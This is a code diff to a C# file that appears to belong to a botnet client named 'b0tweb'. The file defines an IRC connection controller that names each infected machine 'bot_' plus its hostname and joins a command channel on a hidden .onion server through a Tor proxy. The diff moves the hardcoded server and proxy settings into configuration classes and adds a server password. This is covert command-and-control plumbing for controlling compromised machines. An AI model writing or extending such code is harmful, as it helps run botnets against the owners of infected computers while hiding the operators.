@@ -1,6 +1,6 @@
-﻿using b0tweb.MessageHandlers;
+﻿using System;
+using b0tweb.MessageHandlers;
 using Meebey.SmartIrc4net;
-using System;
 
 namespace b0tweb
 {
@@ -16,24 +16,9 @@ namespace b0tweb
         private IrcClient _irc;
 
         /// <summary>
-        /// The Tor server to connect to.
-        /// </summary>
-        private const string Server = "botwebzoqpduhxj7hgbu2f6vooyj3lt3q6f6lxir7wb7xjilmvbzkzid.onion";
-
-        /// <summary>
         /// The IRC port to use fogit r the connection.
         /// </summary>
         private const int Port = 6667;
-
-        /// <summary>
-        /// The proxy host address of the Tor proxy server.
-        /// </summary>
-        private const string ProxyHost = "localhost";
-
-        /// <summary>
-        /// The proxy host port of the Tor proxy server.
-        /// </summary>
-        private const int ProxyPort = 9050;
 
         /// <summary>
         /// The proxy type of the Tor proxy server.
@@ -57,11 +42,12 @@ namespace b0tweb
         {
             Random rand = new Random();
             this._irc = new IrcClient();
+
             this._nick = "bot_" + Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
             this._realName = this._nick + "_real";
 
-            this._irc.ProxyHost = IRCConnectionController.ProxyHost;
-            this._irc.ProxyPort = IRCConnectionController.ProxyPort;
+            this._irc.ProxyHost = TorProxy.Host;
+            this._irc.ProxyPort = TorProxy.Port;
             this._irc.ProxyType = IRCConnectionController.ProxyKind;
         }
 
@@ -102,8 +88,8 @@ namespace b0tweb
         /// <param name="channel">The channel to join.</param>
         public void Join(string channel)
         {
-            this._irc.Connect(IRCConnectionController.Server, IRCConnectionController.Port);
-            this._irc.Login(this._nick, this._realName);
+            this._irc.Connect(Configuration.IRCServer, IRCConnectionController.Port);
+            this._irc.Login(this._nick, this._realName, 0, "", Configuration.IRCPassword);
             this._irc.RfcJoin(channel);
         }
 
